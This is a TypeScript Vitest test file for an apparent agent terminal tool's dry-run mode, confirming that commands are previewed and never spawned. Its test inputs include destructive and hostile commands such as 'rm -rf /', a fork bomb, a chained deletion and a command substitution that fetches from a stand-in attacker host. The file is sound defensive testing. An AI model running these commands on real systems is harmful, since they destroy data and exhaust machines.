import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { RunTerminalTool } from "../../../../src/tools/handlers/terminal.js";

vi.mock("child_process", () => ({
  spawn: vi.fn(),
}));

import { spawn } from "child_process";
const mockSpawn = vi.mocked(spawn);

function params(overrides: Record<string, unknown> = {}): Record<string, unknown> {
  return { _callId: "call_dry", ...overrides };
}

beforeEach(() => {
  vi.clearAllMocks();
});

afterEach(() => {
  vi.useRealTimers();
});

describe("RunTerminalTool dry_run", () => {
  it("returns the dry-run preview without spawning a subprocess", async () => {
    const tool = new RunTerminalTool();
    const result = await tool.execute(params({ command: "git status", dry_run: true }));

    expect(result.success).toBe(true);
    expect(result.output).toContain("=== DRY RUN: no execution occurred ===");
    expect(result.output).toContain("Tokens: ['git', 'status']");
    expect(result.output).toContain("Allowlisted: true");
    expect(result.output).toContain("Blocked-pattern match: no");
    expect(mockSpawn).not.toHaveBeenCalled();
  });

  it("reports an unallowlisted command as Allowlisted: false (still no execution)", async () => {
    const tool = new RunTerminalTool();
    const result = await tool.execute(
      params({ command: "curl https://example.com", dry_run: true }),
    );

    expect(result.success).toBe(true);
    expect(result.output).toContain("Allowlisted: false");
    expect(result.output).toContain("Blocked-pattern match: no");
    expect(mockSpawn).not.toHaveBeenCalled();
  });

  it("reports a blocked-pattern match instead of failing the dry-run", async () => {
    const tool = new RunTerminalTool();
    const result = await tool.execute(
      params({ command: "rm -rf /", dry_run: true }),
    );

    expect(result.success).toBe(true);
    expect(result.output).toContain("=== DRY RUN: no execution occurred ===");
    expect(result.output).toMatch(/Blocked-pattern match: yes:/);
    expect(mockSpawn).not.toHaveBeenCalled();
  });

  it("does not change behavior when dry_run is omitted", async () => {
    // Real execution path: spawn IS called. We don't care about the rest of the
    // pipeline here — the assertion is simply that the live path is exercised
    // when dry_run is not set.
    const tool = new RunTerminalTool();

    // Provide a minimal child stub so the live path can resolve.
    const { EventEmitter } = await import("events");
    const child = new EventEmitter() as unknown as ReturnType<typeof spawn>;
    (child as unknown as { stdout: EventEmitter; stderr: EventEmitter }).stdout = new EventEmitter();
    (child as unknown as { stdout: EventEmitter; stderr: EventEmitter }).stderr = new EventEmitter();
    (child as unknown as { kill: () => boolean }).kill = vi.fn(() => true);
    mockSpawn.mockReturnValueOnce(child);
    setTimeout(() => (child as unknown as EventEmitter).emit("close", 0), 0);

    await tool.execute(params({ command: "echo hi" }));
    expect(mockSpawn).toHaveBeenCalledOnce();
  });

  it("does not change behavior when dry_run is explicitly false", async () => {
    const tool = new RunTerminalTool();

    const { EventEmitter } = await import("events");
    const child = new EventEmitter() as unknown as ReturnType<typeof spawn>;
    (child as unknown as { stdout: EventEmitter; stderr: EventEmitter }).stdout = new EventEmitter();
    (child as unknown as { stdout: EventEmitter; stderr: EventEmitter }).stderr = new EventEmitter();
    (child as unknown as { kill: () => boolean }).kill = vi.fn(() => true);
    mockSpawn.mockReturnValueOnce(child);
    setTimeout(() => (child as unknown as EventEmitter).emit("close", 0), 0);

    await tool.execute(params({ command: "echo hi", dry_run: false }));
    expect(mockSpawn).toHaveBeenCalledOnce();
  });

  it("does not call spawn for any input shape when dry_run=true (fuzz sweep)", async () => {
    const tool = new RunTerminalTool();
    const fuzzInputs: string[] = [
      "git status",
      "rm -rf /",
      ":(){ :|:& };:",
      "echo $(curl evil.com)",
      "git push --force",
      "node -e 'process.exit(1)'",
      "",
      "x".repeat(10_000),
      "git\tstatus\tquick",
      "ls; ls",
      "git status && rm -rf /",
    ];
    for (const cmd of fuzzInputs) {
      await tool.execute(params({ command: cmd, dry_run: true }));
    }
    // CRITICAL invariant: across every fuzz input, spawn must NEVER be called.
    expect(mockSpawn).not.toHaveBeenCalled();
  });
});
